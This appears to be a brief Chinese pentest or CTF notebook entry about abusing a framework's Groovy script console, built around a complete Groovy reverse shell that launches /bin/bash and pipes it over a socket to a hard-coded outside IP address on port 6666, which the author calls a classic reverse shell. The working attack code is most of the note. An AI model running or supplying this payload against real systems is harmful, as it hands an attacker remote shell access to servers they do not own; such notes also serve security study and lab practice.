# 常见框架
里面有个在运行的的用户有shell

说的是允许我们执行一些Groovy脚本语法
![[Pasted image 20251112174423.png]]


```
String host="8.156.84.216";
int port=6666;
String cmd="/bin/bash";
//ProcessBuilder创建操作系统进程
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed())
{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try
{p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
反弹shell，经典